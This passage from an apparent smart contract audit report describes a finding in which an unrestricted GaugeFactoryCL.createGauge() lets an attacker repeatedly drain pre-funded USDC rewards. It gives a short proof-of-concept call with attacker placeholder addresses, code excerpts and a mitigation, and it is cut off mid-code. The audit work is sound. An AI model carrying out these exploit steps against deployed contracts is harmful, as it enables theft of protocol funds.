class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIt is designed to seed a new Algebra eternal farming incentive with an initial, hardcoded amount of 1e10 of the \u003ccode\u003e_rewardToken\u003c/code\u003e. It achieves this by having \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e approve the \u003ccode\u003ealgebraEternalFarming\u003c/code\u003e contract, which is then expected to pull these tokens from \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e. \u003c/p\u003e\n\u003cp\u003eIf the \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e contract is pre-funded with reward tokens to facilitate this initial seeding for legitimate gauges, an attacker can repeatedly call the \u003ccode\u003ecreateGauge\u003c/code\u003e function which will trigger the \u003ccode\u003ecreateEternalFarming\u003c/code\u003e process, causing the reward token to be transferred from \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e to a new Algebra farm associated with a pool specified by the attacker ultimately draining the reward token from the \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e contract.\u003c/p\u003e\n\u003cp\u003eThe attacker can then potentially stake a Liquidity Provider (LP) NFT into this newly created (spam) \u003ccode\u003eGaugeCL\u003c/code\u003e and its associated Algebra farm, and subsequently claim that reward.\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-1\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-1\" aria-label=\"recommended mitigation steps 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eImplement robust access control on the \u003ccode\u003eGaugeFactoryCL.createGauge()\u003c/code\u003e function, restricting its execution to authorized administrators or designated smart contracts, thereby preventing unauthorized calls.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-1\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-1\" aria-label=\"proof of concept 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eProtocol admin pre-funds \u003ccode\u003eGaugeFactoryCL\u003c/code\u003e with \u003ccode\u003e5e10\u003c/code\u003e of USDC (50,000).\u003c/li\u003e\n\u003cli\u003eAttacker calls \u003ccode\u003eGaugeFactoryCL.createGauge()\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"5\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIGaugeFactoryCL\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eGFCL_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateGauge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eUSDC_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,       \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// _rewardToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eVE_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTARGET_POOL_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eATTACKER_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,   \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// _distribution\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eATTACKER_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,   \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// _internal_bribe\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eATTACKER_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,   \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// _external_bribe\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,               \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// _isPair\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,      \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// including ALGEBRA_ETERNAL_FARMING_ADDRESS\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eZERO_ADDRESS\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// _bonusRewardToken\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003eThe public \u003ccode\u003ecreateGauge\u003c/code\u003e function is entered which calls its internal \u003ccode\u003ecreateEternalFarming(_pool, farmingParam.algebraEternalFarming, USDC_ADDRESS, _bonusRewardToken)\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eExecution within \u003ccode\u003eGaugeFactoryCL.createEternalFarming()\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"6\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_pool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1e10\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// 10,000 USDC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// GaugeFactoryCL approves AlgebraEternalFarming to spend its USDC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_rewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e/* USDC_ADDRESS */\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeApprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Call to AlgebraEternalFarming which will pull the approved USDC\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraEternalFarmingCustom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_algebraEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentivekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveParamsWithReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epluginAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecustomDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"5\"\u003e\n\u003cli\u003eExecution within \u003ccode\u003eAlgebraEternalFarming.createEternalFarming()\u003c/code\u003e \u003ca href=\"https://github.com/cryptoalgebra/Algebra/blob/f9a0eff66e2e6d3b9c2b794612cd382aaca8f181/src/farming/contracts/farmings/AlgebraEternalFarming.sol#L125\"\u003ehere\u003c/a\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e/// @inheritdoc IAlgebraEternalFarming\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreateEternalFarming\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveParams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eplugin\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eoverride\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonlyIncentiveMaker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eplugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e != \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eplugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e || \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epluginNotConnected\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIFarmingPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eincentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() != \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eanotherFarmingIsActive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eEternalVirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIFarmingCenter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efarmingCenter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnectVirtualPoolToPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIFarmingPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonce\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumOfIncentives\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveKeys\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes32\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecompute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentives\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_receiveRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan 